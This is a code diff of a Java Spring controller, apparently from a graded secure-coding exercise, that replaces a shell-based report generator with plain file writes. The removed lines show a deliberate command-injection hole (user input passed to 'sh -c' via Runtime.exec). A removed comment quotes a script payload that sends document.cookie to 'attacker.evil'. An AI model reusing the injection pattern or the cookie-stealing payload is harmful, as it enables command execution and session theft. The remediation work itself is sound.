@@ -12,9 +12,11 @@ import javax.servlet.http.HttpSession;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
+import java.nio.charset.StandardCharsets;
 import java.sql.*;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.UUID;
 
 @Controller
 public class ShelterController {
@@ -115,26 +117,17 @@ public class ShelterController {
     }
 
     // -------------------------------------------------------------------
-    // [VULN-2] CWE-78/88: Command Argument Injection — SIGUE ABIERTA
-    // (se corrige en la Ronda 2, no en esta). Se deja el comportamiento
-    // original para no adelantar esa corrección.
-    //
-    // [FIX] Reflected XSS (hallazgo no planeado de SonarQube, Blocker) —
-    // corregido en esta Ronda 1. Antes, `petName` se devolvía tal cual en
-    // el cuerpo de la respuesta HTTP (@ResponseBody, sin pasar por el
-    // motor de plantillas), por lo que un valor como
-    //     <script>document.location='http://attacker.evil/steal?c='+document.cookie</script>
-    // se reflejaba sin escapar. Ahora se escapa con HtmlUtils.htmlEscape
-    // antes de incluirlo en la respuesta.
+    // Se genera el archivo directamente con Java, sin invocar un shell ni
+    // interpolar petName en un comando del sistema.
     // -------------------------------------------------------------------
     @PostMapping("/generate-report")
     @ResponseBody
     public String generateReport(@RequestParam String petName) throws Exception {
-        String command = "sh -c \"echo Reporte veterinario de " + petName +
-                " > /tmp/report_" + petName + ".txt\"";                       // [VULN-2] pendiente Ronda 2
-        Runtime.getRuntime().exec(command);                                   // [VULN-2] pendiente Ronda 2
-        String safePetName = HtmlUtils.htmlEscape(petName);                   // [FIX XSS]
-        return "Reporte generado para " + safePetName;                       // [FIX XSS]
+        Path reportsDir = Paths.get(UPLOAD_DIR, "reports");
+        Files.createDirectories(reportsDir);
+        Path report = reportsDir.resolve("report_" + UUID.randomUUID() + ".txt");
+        Files.write(report, ("Reporte veterinario de " + petName).getBytes(StandardCharsets.UTF_8));
+        return "Reporte generado para " + HtmlUtils.htmlEscape(petName);
     }
 
     // -------------------------------------------------------------------
